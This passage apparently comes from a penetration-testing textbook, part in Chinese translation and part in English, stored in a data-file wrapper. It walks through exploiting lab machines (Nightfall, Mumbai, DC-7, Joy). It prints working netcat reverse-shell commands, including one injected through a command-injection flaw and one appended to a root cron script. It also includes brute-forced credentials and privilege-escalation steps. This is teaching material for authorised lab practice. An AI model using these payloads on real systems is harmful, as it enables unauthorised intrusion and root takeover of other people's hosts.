    \n`Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php`\n\n\
    在进入通过 ssh 获取访问的精彩部分之前，请打开终端会话并使用 `cat <filename>` 命令检查 `46676.php` 漏洞。\n\n![](img/Figure-8.32.jpg)\n\
    \n**图 8.32：** `46676.php` 漏洞源代码\n\n对该漏洞的适用性做出你的观察，并进入下一步。\n\n通过执行命令 `ssh matt@10.0.2.5`\
    \ 获取 Nightfall 目标上 `matt` 账户的访问，并通过输入 `yes` 接受 ECDSA 指纹。\n\n![](img/Figure-8.33.jpg)\n\
    \n**图 8.33：** 使用公钥成功为用户 `matt` 访问 SSH\n\n我们已成功以用户 `matt` 的身份访问了系统。\n\n记录目前为止的观察结果，我们将在下一章继续研究这台机器。\n\
    \n## 观察笔记：\n\n**IP 地址：** 10.0.2.5\n\n**操作系统：** Debian Linux\n\n**开放端口与服务：**\n\n\
    - `21/tcp` ftp\n  - `pyftpdlib 1.5.5`\n  - 用户:`matt:Password:cheese`（通过使用 `hydra`\
    \ 进行暴力破解攻击）\n  - 向用户 `matt` 家目录下的 `.ssh` 文件夹上传了 `authorized_keys`\n- `22/tcp`\
    \ ssh\n  - `OpenSSH 7.9p1 Debian 10 (protocol 2.0)`\n  - 使用 `sshauthorized_keys`\
    \ 获取了用户 `matt` 的登录。\n- `80/tcp` http\n  - `Apache httpd 2.4.38 ((Debian))`\n \
    \ - 发现漏洞\n    - `Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php`\n\
    - `139/tcp` netbios-ssn\n  - `Samba smbd 3.X - 4.X (workgroup: WORKGROUP)`\n \
    \ - 发现用户：`matt`, `nightfall`\n- `445/tcp` netbios-ssn\n  - `Samba smbd 3.X - 4.X\
    \ (workgroup: WORKGROUP)`\n- `3306/tcp` mysql\n  - `MySQL 5.5.5-10.3.15-MariaDB-1`\n\
    \  - 用户 `matt` 登录拒绝\n- `137/udp` netbios-ns\n  - `Samba nmbdnetbios-ns (workgroup:\
    \ WORKGROUP)`\n- `5353/udp` dns\n  - 基于 DNS 的服务发现\n\n# Mumbai\n\n在识别出运行在端口 8000\
    \ 的 `test.php` API 中的 `query` 参数存在命令注入漏洞后，Mumbai 目标的研究阶段结束。\n\n我们还识别了目标系统运行的 Apache\
    \ 服务的两个漏洞。\n\n`Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php`\n\
    `Apache < 2.2.34 / < 2.4.27 - OPTIONS M | exploits/linux/webapps/42745.py`\n\n\
    我们将通过使用命令注入漏洞来获取反向 shell。使用 `whereis nc` 命令检查目标系统是否安装了 `netcat`：\n\n![](img/Figure-8.34.jpg)\n\
    \n**图 8.34：** 利用命令注入寻找 netcat\n\n目标系统上安装了 Netcat，但如所示，版本为 `nc.openbsd`，这与传统版本不同。互联网上的\
    \ [`manpages.ubuntu.com/manpages/bionic/man1/nc_openbsd.html`](http://manpages.ubuntu.com/manpages/bionic/man1/nc_openbsd.html)\
    \ 提到不支持 `-e` 选项，就像它的 FreeBSD 兄弟版本一样，我们将使用其他方法获取反向 shell。\n\n通过在 Kali 系统上运行 `netcat`\
    \ 监听并配置其接收端口 9879 的连接开始。\n\n![](img/Figure-8.35.jpg)\n\n**图 8.35：** 设置 netcat\
    \ 监听\n\n我们的监听已完成并等待端口 9879 的连接。在本例中，我们将使用在第 3 章 中学到的输入输出重定向技巧向我们的 Kali 系统发送 shell，尽管缺少\
    \ `-e` 标记。实现此点的命令字符串如下：\n\n```bash\nrm /tmp/fifo;mknod /tmp/fifo p;/bin/sh 0</tmp/fifo|nc\
    \ 10.0.2.2 9879 1>/tmp/fifo;done\n```\n\n我们将 payload 发送到目标并等待连接。\n\n![](img/Figure-8.36.jpg)\n\
    \n**图 8.36：** 使用命令注入漏洞执行反 shell\n\n上述命令在 `/tmp` 目录内创建一个名为 `fifo` 的命名管道文件，`fifo`\
    \ 文件的内容作为 STDIN 输入供给 `/bin/sh`，来自 `sh` 的响应被管道到 `netcat` 二进制文件，后者反而向我们的 Kali 系统端口\
    \ 9879 发起连接。最后，来自 `netcat` 的任何 STDOUT 数据写回 `fifo` 文件，由 `/bin/sh` shell 解析，从而完成循环并给我们一个完全工作的\
    \ reverse shell。\n\n![](img/Figure-8.37.jpg)\n\n**图 8.37：** 连接回 netcat 监听\n\n\
    远程 `netcat` 提供了一个可用的 reverse shell，我们能够在目标上执行 `id` 命令。`id` 命令的输出显示我们目前拥有 `apiuser`\
    \ 权限并是 `docker` 组成员。\n\n记录目前为止的观察结果，我们将在下一章继续研究这台机器。\n\n## 观察笔记：\n\n**IP 地址：**\
    \ 10.0.2.6\n\n**操作系统：** Ubuntu Linux\n\n**开放端口与服务：**\n\n- `21/tcp` ftp\n  - `vsftpd\
    \ 3.0.3`\n  - 允许匿名 FTP，文件 `Note` 暴露了安全问题\n- `22/tcp` ssh\n  - `OpenSSH 7.6p1 Ubuntu`\n\
    - `80/tcp` http\n  - `Apache httpd 2.4.29`\n  - 发现漏洞\n    - `Apache 2.4.17 < 2.4.38\
    \ - 'apache2ctl g | exploits/linux/local/46676.php`\n    - `Apache < 2.2.34 /\
    \ < 2.4.27 - OPTIONS M | exploits/linux/webapps/42745.py`\n  - `WordPress 5.2.3`\n\
    \  - 启用了 XMLRPC 可能导致安全问题\n  - 用户 `absozedfound`\n- `3306/tcp` mysql\n  - `MySQL\
    \ 5.5.5-10.3.15-MariaDB-1`\n- `8000/tcp` http\n  - `nginx 1.14.0`\n  - 发现 `.bash*`\
    \ 文件，表明 web 根可能是用户的家目录\n  - Docker 容器由系统用户构建，并将 `/api` 目录添加到 `PATH` 变量中\n  - API\
    \ `http://10.0.2.6:8000/test.php` 执行 python 脚本 `keywords.py` 来生成单词数\n  - API 容易受到使用符号\
    \ `;`、`|` 和 `%0a` 的命令注入\n\nNetcat 不支持执行功能\n\nreverse shell 通过命令管道和输入输出重定向获得了 reverse\
    \ shell。\n\n# 结论\n\n在本章中，我们涵盖了用于利用目标系统漏洞的工具和技术。此外，我们还通过实践练习学习了自动化和手动利用。\n"
- fmt: "\nThe next chapter will focus on elevating the user access that we have obtained\
    \ to gain administrative privileges on the target hosts.\n\n# Questions\n\n1.\
    \ Which command is used to start the Metasploit framework?\n2. Which command is\
    \ used within Metasploit to display module configuration?\n3. Which linux command\
    \ did we use to create the FIFO file used during exploitation of the Mumbai:1\
    \ target?\n\n# CHAPTER 9\n\n## Post Exploitation\n\nIn the previous chapter we\
    \ covered the topic of exploitation of the target systems and learnt about using\
    \ the various tools and techniques applicable during the exploitation phase of\
    \ a penetration test to obtain initial level of access on the target systems.\n\
    \nThis chapter will delve into the subject of post exploitation and activities\
    \ performed in this phase, we will leverage upon the initial access obtained on\
    \ the target systems and information gained about them during the previous chapters\
    \ to completely take over the target systems by obtaining administrative access\
    \ on them.\n\n# Structure\n\nIn this chapter, we will touch upon the following\
    \ topics:\n\n* Attacking administrative scheduled jobs.\n* Attacking privileged\
    \ scripts and binaries.\n* Scanning using automated scripts.\n* Exploiting Kernel\
    \ or Privileged services.\n\nWe will also follow following objectives:\n\n# Objectives\n\
    \nAfter reading this chapter, you will be able to:\n\n* Perform manual and automated\
    \ scan to identify potential points of privilege escalation.\n* Transfer files\
    \ between Kali and target hosts using `netcat`.\n* Exploit SUID SGID binaries.\n\
    * Exploit Kernel or system processes to elevate access.\n* Crack password hashes.\n\
    * Perform escape sequences to obtain shell.\n* So, let's begin with the next steps.\n\
    \n# DC-7\n\nDuring the previous chapter we had uploaded a PHP reverse shell on\
    \ the target and gained initial access into the DC-7 target with the privileges\
    \ of `www-data` user.\n\nContinuing further, we opened up the Drupal/PHP reverse\
    \ shell that we received on port 9876 in the previous chapter, we will leverage\
    \ this shell to exploit the system to obtain privileged access.\n\nYou might recall\
    \ that the `backups.sh` file group was set to `www-data` in [Chapter 7, Vulnerability\
    \ Research].\n\n![](images/Figure-9.1.jpg)\n\n**Figure 9.1:** `backups.sh` file\
    \ permissions\n\nNow upon checking the file permissions we can re-confirm that\
    \ the `www-data` group has read, write and execute permissions to the `backups.sh`\
    \ file.\n\nYou may also remember from [Chapter 7, Vulnerability Research] that\
    \ the `backups.sh` script is executed by the cron daemon to perform backups tasks\
    \ using root privileges.\n\nWe already have written access to the `backups.sh`\
    \ file, and hence the easiest way to obtain root is to simply add a reverse shell\
    \ entry in the `backups.sh` file, and wait for cron daemon to execute it as root.\n\
    \nOn a separate Kali terminal window setup, a `netcat` listener to listen on port\
    \ 9879 to receive the root shell.\n\n![](images/Figure-9.2.jpg)\n\n**Figure 9.2:**\
    \ Setting up `netcat` listener\n\nLet’s go back to the window containing the Drupal/PHP\
    \ reverse shell to append the payload to the `/opt/scripts/backups.sh` file.\n\
    \n1. Enter the `/opt/scripts` directory using the `cd` command.\n2. Type the command\
    \ `echo \"nc 10.0.2.238 9879 -e /bin/bash\" >> ./backups.sh`.\n\n![](images/Figure-9.3.jpg)\n\
    \n**Figure 9.3:** Appending `netcat` reverse shell command inside `backups.sh`\
    \ script\n\nThe output of `tail` command on `backups.sh` shows that our payload\
    \ has been successfully added to the file. All we have to do now is to wait for\
    \ the cron daemon to execute the `backups.sh` job, and receive a reverse shell\
    \ on our `netcat` listener port 9879.\n\nIf you have set up things correctly,\
    \ then you should receive a connect back from the DC7 target with root privileges.\
    \ Upon receiving the connect back confirm the privileges by executing the `id`\
    \ command and viewing the contents of `theflag.txt` file in the root user’s home\
    \ directory.\n\n![](images/Figure-9.4.jpg)\n\n**Figure 9.4:** Success!! DC7 target\
    \ has been rooted\n\nWell done! You have successfully obtained administrative\
    \ privileges on the DC7 target.\n\nTake notes on the observations made.\n\n**Observation\
    \ Notes:**\n\n**IP address:** 10.0.2.27\n**Operating System:** Linux (Debian 10\
    \ based)\n**Open Ports & Services:**\n* 22/tcp - SSH\n    * OpenSSH 7.4p1 (gathered\
    \ from service banner)\n    * SSH allows login for `dc7user` using the credentials\
    \ found on GitHub page.\n    * Bash script `/opt/scripts/backup.sh` used to backup\
    \ website and sql database.\n    * Cron is being used to run the `backup.sh` script\
    \ periodically.\n    * `Backup.sh` script can be modified by the root user or\
    \ users belonging to the `www-data` group.\n        * The script was appended\
    \ with a `netcat` reverse shell payload to obtain root privileges.\n    * Drush\
    \ is being used to administer Drupal\n* 80/tcp - HTTP\n    * Apache 2.4.25 (gathered\
    \ from service banner)\n        * Found `robots.txt`\n        * Drupal 8 (gathered\
    \ from page source)\n        * Admin password changed to ‘admin123’\n        *\
    \ PHP Filter module was uploaded and enabled to allow custom PHP code execution.\n\
    \        * PHP reverse shell was uploaded to the server.\n            * ![](images/ent.jpg)\
    \ Reverse connection established with privileges of `www-data` user.\n    * Internet\
    \ handle `@DC7user` on the main page\n        * Google search of the handle revealed\
    \ Twitter and Github accounts.\n        * Found source-code and credentials `dc7user`\
    \ and ‘MdR3xOgB7#dW’\n* `/opt/scripts/backups.sh` is writable by users belonging\
    \ to `www-data` group\n* The script was appended with a `netcat` reverse shell\
    \ payload to obtain root privileges.\n\n# Digitalworld.local:Joy\n\nIn the previous\
    \ chapter we exploited a proftpd vulnerability on the Joy system and obtained\
    \ shell access using the Metasploit framework, we further logged into user Patrick’s\
    \ account using the credentials found while exploiting the target system.\n\n\
    Before we begin exploring the system further, open up the Metasploit reverse shell\
    \ and `sudo` into Patrick’s account.\n\nLet’s begin by checking the list of commands\
    \ that the user Patrick can run with administrative privileges.\n\n![](images/Figure-9.5.jpg)\n\
    \n**Figure 9.5:** `sudo -l` command output\n\nThe output of `sudo -l` command\
    \ shows that patrick can run `/home/patrick/script/test` as root. Let’s explore\
    \ the test file, and see what we can do with it.\n\n![](images/Figure-9.6.jpg)\n\
    \n**Figure 9.6:** Permission denied while trying to view contents of test file\n\
    \nAt this stage an attempt to read the file using the `cd` command failed with\
    \ a permission denied error. Let’s check the file permissions to determine the\
    \ cause.\n\n![](images/Figure-9.7.jpg)\n\n**Figure 9.7:** Checking test file permissions\n\
    \nThe user patrick does not have the requisite permissions to enter the script\
    \ directory or even perform directory listing on the file.\n\nAnyway, the user\
    \ Patrick has the requisite sudo permissions to execute the `/home/patrick/script/test`\
    \ file as root so we’ll just have to dive in and figure the rest out as we go.\n\
    \n![](images/Figure-9.8.jpg)\n\n**Figure 9.8:** Executing test script with `sudo`\n\
    \nThe script has been created to change permissions files ostensibly within the\
    \ directory, let’s see if we can escape the directory limitation to modify permissions\
    \ of the parent directory.\n\nWhile you can opt to rewrite permissions of the\
    \ system files such as `/etc/passwd` or `/etc/shadow` this process will be an\
    \ inconvenient approach involving modification of the relevant entries for user\
    \ patrick or root user.\n"
